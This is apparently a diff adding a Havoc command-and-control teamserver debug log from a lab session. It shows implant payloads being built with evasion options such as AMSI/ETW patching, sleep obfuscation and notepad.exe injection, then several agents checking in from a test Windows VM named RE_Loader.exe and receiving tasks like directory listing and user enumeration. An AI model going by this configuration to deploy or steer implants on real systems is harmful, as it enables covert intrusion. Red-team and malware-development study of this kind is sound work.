@@ -1,0 +1,425 @@
+              _______           _______  _______ 
+    │\     /│(  ___  )│\     /│(  ___  )(  ____ \
+    │ )   ( ││ (   ) ││ )   ( ││ (   ) ││ (    \/
+    │ (___) ││ (___) ││ │   │ ││ │   │ ││ │      
+    │  ___  ││  ___  │( (   ) )│ │   │ ││ │      
+    │ (   ) ││ (   ) │ \ \_/ / │ │   │ ││ │      
+    │ )   ( ││ )   ( │  \   /  │ (___) ││ (____/\
+    │/     \││/     \│   \_/   (_______)(_______/
+
+  	 pwn and elevate until it's done
+
+[11:54:29] [DBUG] [cmd.init.func2:59]: Debug mode enabled
+[11:54:29] [INFO] Havoc Framework [Version: 0.7] [CodeName: Bites The Dust]
+[11:54:29] [INFO] Havoc profile: ./profiles/havoc.yaotl
+[11:54:29] [INFO] Build: 
+ - Compiler x64 : data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc
+ - Compiler x86 : data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc
+ - Nasm         : /usr/bin/nasm
+[11:54:29] [INFO] Time: 13/07/2024 11:54:29
+[11:54:29] [INFO] Teamserver logs saved under: data/loot/2024.07.13._11:54:29
+[11:54:29] [DBUG] [server.(*Teamserver).Start:53]: Starting teamserver...
+[11:54:29] [INFO] Starting Teamserver on wss://0.0.0.0:40056
+[11:54:29] [INFO] [SERVICE] starting service handle on wss://0.0.0.0:40056/service-endpoint
+[11:54:29] [INFO] Opens existing database: data/teamserver.db
+[11:54:29] [DBUG] [certs.HTTPSGenerateRSACertificate:301]: Generating TLS certificate (RSA) for '0.0.0.0' ...
+[11:54:29] [INFO] Starting 1 listeners from last session
+[11:54:29] [DBUG] [handlers.(*HTTP).Start:204]: Setup HTTP/s Server
+[11:54:29] [INFO] Started "1" listener: http://192.168.17.137:80
+[11:54:29] [INFO] Restored 8 agents from last session
+[11:54:29] [DBUG] [server.(*Teamserver).Start:492]: Wait til the server shutdown
+[11:54:29] [DBUG] [certs.generateCertificate:223]: Valid from 2024-04-19 11:54:29.961169265 -0400 EDT to 2027-04-19 11:54:29.961169265 -0400 EDT
+[11:54:29] [DBUG] [certs.generateCertificate:228]: Serial Number: 203855116672400986675141363202570089886
+[11:54:29] [DBUG] [certs.generateCertificate:234]: Authority certificate
+[11:54:29] [DBUG] [certs.generateCertificate:247]: ExtKeyUsage = [1 2]
+[11:54:29] [DBUG] [certs.generateCertificate:263]: Certificate authenticates IP address: 0.0.0.0
+[11:54:29] [DBUG] [certs.generateCertificate:278]: Certificate is an AUTHORITY
+[11:54:31] [DBUG] [server.(*Teamserver).ClientAuthenticate:658]: Found User: 5pider
+[11:54:31] [DBUG] [server.(*Teamserver).ClientAuthenticate:665]: User 5pider is authenticated
+[11:54:31] [GOOD] User <5pider> Authenticated
+[11:54:37] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[11:54:37] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Foliage Stack Duplication:false]
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[11:54:37] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/551727573a/aa87e7dd73.o
+[11:54:37] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/551727573a/83bc0343f4.o
+[11:54:37] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
+[11:54:37] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[11:54:37] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Foliage Stack Duplication:false]
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[11:54:37] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[11:54:37] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/513a9a7fdc/d4a7273a6e.o
+[11:54:37] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/513a9a7fdc/65d6289f97.o
+[11:54:37] [DBUG] [builder.(*Builder).Build:379]: Compile dll
+[11:55:36] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
+[11:57:34] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[11:57:34] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 4c27f514
+[11:57:34] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (4c27f514) == DemonID (4c27f514)
+
+[11:57:34] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[11:57:34] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 9776
+ProcessTID  : 18472
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x29dba290000
+
+[11:57:34] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[11:57:34] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[11:57:34] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[11:57:34] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[11:57:47] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 4c27f514, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[11:57:55] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 4c27f514, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: 4f94fb50
+[11:57:55] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 4c27f514, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: 860c26f2
+[11:57:55] [DBUG] [agent.(*Agent).TaskDispatch:3375]: Agent: 4c27f514, Command: BEACON_OUTPUT - CALLBACK_OUTPUT
+[11:57:55] [DBUG] [agent.(*Agent).TaskDispatch:3998]: Agent: 4c27f514, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK
+[12:34:49] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 4c27f514, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: 326ef3a4
+[12:34:49] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 4c27f514, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: ec9e95dd
+[12:34:49] [DBUG] [agent.(*Agent).TaskDispatch:3375]: Agent: 4c27f514, Command: BEACON_OUTPUT - CALLBACK_OUTPUT
+[12:34:49] [DBUG] [agent.(*Agent).TaskDispatch:3998]: Agent: 4c27f514, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK
+[12:43:07] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[12:43:07] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 71e0b2de
+[12:43:07] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (71e0b2de) == DemonID (71e0b2de)
+
+[12:43:07] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[12:43:07] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 12116
+ProcessTID  : 20568
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x23c65e50000
+
+[12:43:07] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[12:43:07] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[12:43:07] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[12:43:07] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[12:43:24] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 71e0b2de, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[12:43:28] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 71e0b2de, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: 26fe454e
+[12:43:28] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 71e0b2de, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: c215d347
+[12:43:28] [DBUG] [agent.(*Agent).TaskDispatch:3375]: Agent: 71e0b2de, Command: BEACON_OUTPUT - CALLBACK_OUTPUT
+[12:43:28] [DBUG] [agent.(*Agent).TaskDispatch:3998]: Agent: 71e0b2de, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK
+[12:43:36] [DBUG] [agent.(*Agent).TaskDispatch:2832]: Agent: 71e0b2de, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR
+[12:44:09] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 71e0b2de, Command: COMMAND_SLEEP, SleepDelay: 20, SleepJitter: 0
+[12:47:33] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[12:47:33] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 78484eb6
+[12:47:33] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (78484eb6) == DemonID (78484eb6)
+
+[12:47:33] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[12:47:33] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 16956
+ProcessTID  : 19060
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x1d9ff0d0000
+
+[12:47:33] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[12:47:33] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[12:47:33] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[12:47:33] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[12:47:46] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 78484eb6, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[12:47:50] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 78484eb6, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: 121e1bb0
+[12:47:50] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 78484eb6, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: 3db3378e
+[12:47:50] [DBUG] [agent.(*Agent).TaskDispatch:3375]: Agent: 78484eb6, Command: BEACON_OUTPUT - CALLBACK_OUTPUT
+[12:47:50] [DBUG] [agent.(*Agent).TaskDispatch:3998]: Agent: 78484eb6, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK
+[12:47:58] [DBUG] [agent.(*Agent).TaskDispatch:2832]: Agent: 78484eb6, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR
+[12:48:23] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 78484eb6, Command: COMMAND_SLEEP, SleepDelay: 20, SleepJitter: 0
+[12:52:40] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 78484eb6, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[12:52:52] [DBUG] [agent.(*Agent).TaskDispatch:5117]: Agent: 78484eb6, Command: COMMAND_NET - DEMON_NET_COMMAND_USERS
+[13:03:09] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[13:03:09] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 6b925c34
+[13:03:09] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (6b925c34) == DemonID (6b925c34)
+
+[13:03:09] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[13:03:09] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 19656
+ProcessTID  : 5400
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x23677cb0000
+
+[13:03:09] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[13:03:09] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[13:03:09] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[13:03:09] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[13:03:19] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 6b925c34, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[13:03:23] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 6b925c34, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: b09aff52
+[13:03:23] [DBUG] [agent.(*Agent).TaskDispatch:6384]: Agent: 6b925c34, Command: COMMAND_MEM_FILE, Success: 1, MemFileID: c5649073
+[13:03:23] [DBUG] [agent.(*Agent).TaskDispatch:3375]: Agent: 6b925c34, Command: BEACON_OUTPUT - CALLBACK_OUTPUT
+[13:03:23] [DBUG] [agent.(*Agent).TaskDispatch:3998]: Agent: 6b925c34, Command: COMMAND_INLINEEXECUTE - COMMAND_INLINEEXECUTE_RAN_OK
+[13:03:23] [DBUG] [agent.(*Agent).TaskDispatch:2832]: Agent: 6b925c34, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR
+[04:18:16] [DBUG] [handlers.handleDemonAgent:84]: Agent: 6b925c34, Command: DEMON_INIT
+[04:18:16] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[04:18:16] [DBUG] [handlers.handleDemonAgent:95]: reconnected 6130dcf1
+[04:19:47] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[04:19:47] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 64c3ca24
+[04:19:47] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (64c3ca24) == DemonID (64c3ca24)
+
+[04:19:47] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[04:19:47] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 21088
+ProcessTID  : 13992
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x222cafc0000
+
+[04:19:47] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[04:19:47] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[04:19:47] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[04:19:47] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[04:19:57] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 64c3ca24, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[04:57:52] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 64c3ca24, Command: COMMAND_SLEEP, SleepDelay: 20, SleepJitter: 0
+[05:01:47] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 64c3ca24, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[05:04:29] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[05:04:29] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Zilean Stack Duplication:false]
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:04:29] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/b6a0b721d6/7ebd0ff1c6.o
+[05:04:29] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/b6a0b721d6/1f9a4b89d2.o
+[05:04:29] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
+[05:04:29] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[05:04:29] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Zilean Stack Duplication:false]
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:04:29] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:04:29] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/db85182eb6/9f2a281b2e.o
+[05:04:29] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/db85182eb6/b56882fb75.o
+[05:04:29] [DBUG] [builder.(*Builder).Build:379]: Compile dll
+[05:05:46] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
+[05:17:17] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[05:17:17] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 4f735ce6
+[05:17:17] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (4f735ce6) == DemonID (4f735ce6)
+
+[05:17:17] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[05:17:17] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 21152
+ProcessTID  : 21488
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x20d4b040000
+
+[05:17:17] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[05:17:17] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[05:17:17] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[05:17:17] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[05:17:32] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[05:17:32] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 7c2145c2
+[05:17:32] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (7c2145c2) == DemonID (7c2145c2)
+
+[05:17:32] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[05:17:32] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 19468
+ProcessTID  : 20056
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x1e44d460000
+
+[05:17:32] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[05:17:32] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[05:17:32] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[05:17:32] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[05:18:49] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[05:18:49] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Exe
+[05:18:49] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rbx Sleep Technique:Ekko Stack Duplication:false]
+[05:18:49] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:18:49] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:18:49] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:18:49] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:18:49] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/d5f164d5c3/1cd5a36bbb.o
+[05:18:49] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/d5f164d5c3/257d9c42c0.o
+[05:18:49] [DBUG] [builder.(*Builder).Build:359]: Compile exe
+[05:20:38] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[05:20:38] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Shellcode
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:20:38] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/7a7bb0a535/af783875aa.o
+[05:20:38] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/7a7bb0a535/3b381207e9.o
+[05:20:38] [DBUG] [builder.(*Builder).Build:389]: Compile dll and prepend shellcode to it.
+[05:20:38] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[05:20:38] [DBUG] [builder.(*Builder).SetPatchConfig:465]: Set Patch config from Profile
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlCreateTimer Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:WaitForSingleObjectEx Stack Duplication:false]
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:20:38] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:20:38] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/a0705cc9c5/18846b4eca.o
+[05:20:38] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/a0705cc9c5/57b06ee991.o
+[05:20:38] [DBUG] [builder.(*Builder).Build:379]: Compile dll
+[05:20:47] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
+[05:20:47] [DBUG] [server.(*Teamserver).DispatchEvent.func18:882]: Windows Exe
+[05:20:47] [DBUG] [builder.(*Builder).PatchConfig:579]: map[Amsi/Etw Patch:Hardware breakpoints Indirect Syscall:false Injection:map[Alloc:Native/Syscall Execute:Native/Syscall Spawn32:C:\Windows\SysWOW64\notepad.exe Spawn64:C:\Windows\System32\notepad.exe] Jitter:15 Proxy Loading:RtlRegisterWait Sleep:2 Sleep Jmp Gadget:jmp rax Sleep Technique:Ekko Stack Duplication:false]
+[05:20:47] [DBUG] [builder.(*Builder).PatchConfig:915]: Host => 192.168.17.137
+[05:20:47] [DBUG] [builder.(*Builder).PatchConfig:940]: host only
+[05:20:47] [DBUG] [builder.(*Builder).PatchConfig:971]: 
+[05:20:47] [DBUG] [builder.(*Builder).PatchConfig:982]: 
+[05:20:47] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Spoof.x64.asm -o /tmp/4af1ed359e/8444bf426e.o
+[05:20:47] [DBUG] [builder.(*Builder).Build:331]: /usr/bin/nasm -f win64 src/asm/Syscall.x64.asm -o /tmp/4af1ed359e/fadbb50efd.o
+[05:20:47] [DBUG] [builder.(*Builder).Build:359]: Compile exe
+[05:21:58] [DBUG] [builder.(*Builder).Build:410]: Successful compiled Dll
+[05:23:00] [DBUG] [handlers.handleDemonAgent:262]: Agent does not exists. hope this is a register request
+[05:23:00] [DBUG] [agent.ParseDemonRegisterRequest:404]: Parsed DemonID: 7daa34d6
+[05:23:00] [DBUG] [agent.ParseDemonRegisterRequest:412]: AgentID (7daa34d6) == DemonID (7daa34d6)
+
+[05:23:00] [DBUG] [agent.ParseDemonRegisterRequest:424]: 
+Hostname: WINDEV2401EVAL
+Username: User
+Domain  : 
+InternIP: 192.168.17.131
+ExternIP: 192.168.17.131
+
+[05:23:00] [DBUG] [agent.ParseDemonRegisterRequest:441]: 
+ProcessName : C:\Users\User\Desktop\WinDev\Maldev\Maldev2\RE_Loader\x64\Release\RE_Loader.exe
+ProcessPID  : 14772
+ProcessTID  : 21720
+ProcessPPID : 0
+ProcessArch : 2
+Elevated    : 0
+Base Address: 0x215a8850000
+
+[05:23:00] [DBUG] [agent.ParseDemonRegisterRequest:459]: 
+SleepDelay  : 2
+SleepJitter : 15
+
+[05:23:00] [DBUG] [agent.ParseDemonRegisterRequest:594]: Finished parsing demon
+[05:23:00] [DBUG] [packer.(*Packer).Build:87]: No Aes Key specified
+[05:23:00] [DBUG] [handlers.handleDemonAgent:295]: Finished request
+[05:24:06] [DBUG] [agent.(*Agent).TaskDispatch:2661]: Agent: 7daa34d6, Command: COMMAND_SLEEP, SleepDelay: 3, SleepJitter: 0
+[05:50:34] [DBUG] [builder.NewBuilder:179]: Payload Builder: Enable Debug Mode false
